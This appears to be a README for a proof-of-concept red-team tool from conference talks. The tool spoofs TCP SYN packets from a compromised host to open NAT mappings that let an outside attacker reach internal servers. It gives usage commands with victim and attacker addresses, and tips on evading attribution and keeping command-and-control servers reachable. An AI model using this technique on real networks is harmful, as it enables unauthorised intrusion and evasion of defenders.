# Simple TCP SYN Spoofing to Trigger NAT Traversal
- An easy tool that abuses SNAT and opens a temporary DNAT by sending fake TCP SYN packets. This creates a breakpoint for red teaming under NAT environments!

## Special Thanks
- This method was discovered by Chumy Tsai ([@Jimmy01240397](https://github.com/Jimmy01240397)).
- Note: Latest kernels behave differently. Jimmy01240397 will provide solutions on how to continue using this method with some tricks.

## Reference

- This is a PoC code for Talks: From Spoofing to Tunneling: New Red Team's Networking Techniques for Initial Access and Evasion
    - [Black Hat USA 2025 Briefing](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678)
    - [DEF CON 33 Main Stage](https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316)
    - [HITCON 2025](https://hitcon.org/2025/en-US/agenda/)

## Usage

1. **Know Your Public IP** (example IP: `9.9.9.9`):

2. **Send a Fake TCP SYN to Trigger NAT on the Compromised Device**  
   - NAT public IP: `2.2.2.2`
   - Compromised device internal IP: `192.168.1.2`
   - Internal web server IP: `192.168.1.3:8080`

    ```bash
    python3 main.py -s <next_attack_victim> -sp <next_attack_victim_port> -d <attacker_public_ip> -dp <attacker_port_to_connect>
    sudo python3 main.py -s 192.168.1.3 -sp 8080 -d 2.2.2.2 -dp 55555
    ```

3. **Now you can directly access** `http://192.168.1.3:8080/` **via** `curl http://2.2.2.2:8080/ --local-port 55555`  on `9.9.9.9` only.

4. **Logs from 192.168.1.3:**

    ```
    python3 -m http.server 8080
    Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
    9.9.9.9 - - [07/Jun/2025 10:10:08] "GET / HTTP/1.1" 200 -
    ```
    > You will see that the logs show requests coming from 9.9.9.9, making it difficult to associate them with 192.168.1.2.

    > The only way to relate them is by dumping packets on the physical port of 192.168.1.2 and finding the fake packet (MAC source can also be spoofed).

## Best Practices
- Use different IP C&C servers for `192.168.1.2` and `192.168.1.3` to prevent `9.9.9.9` from being banned and losing the C&C connection.

## Demo Video
- [YouTube](https://youtu.be/02bOz_GADDI)

## Disclaimer
This project is intended for educational and research purposes only. Any actions and/or activities related to this code are solely your responsibility. The authors and contributors are not responsible for any misuse or damage caused by this project. Please ensure that you have proper authorization before testing, using, or deploying any part of this code in any environment. Unauthorized use of this code may violate local, state, and federal laws.

## License
This project is licensed under the terms of the MIT license.
